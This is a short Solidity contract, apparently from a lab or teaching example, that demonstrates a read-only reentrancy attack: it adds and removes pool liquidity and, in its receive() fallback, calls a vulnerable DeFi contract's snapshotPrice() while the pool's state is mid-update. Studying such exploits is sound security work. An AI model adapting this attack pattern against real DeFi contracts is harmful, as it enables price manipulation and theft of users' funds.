//SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.7;

import "./ReadOnly.sol";

contract ReadOnlyAttacker {
    VulnerableDeFiContract defi;
    ReadOnlyPool pool;

    constructor(address defi_, address pool_) {
        defi = VulnerableDeFiContract(defi_);
        pool = ReadOnlyPool(pool_);
    }

    function attack() external payable {
        pool.addLiquidity{value: msg.value}();
        pool.removeLiquidity();
    }

    receive() external payable {
        defi.snapshotPrice();
    }
}
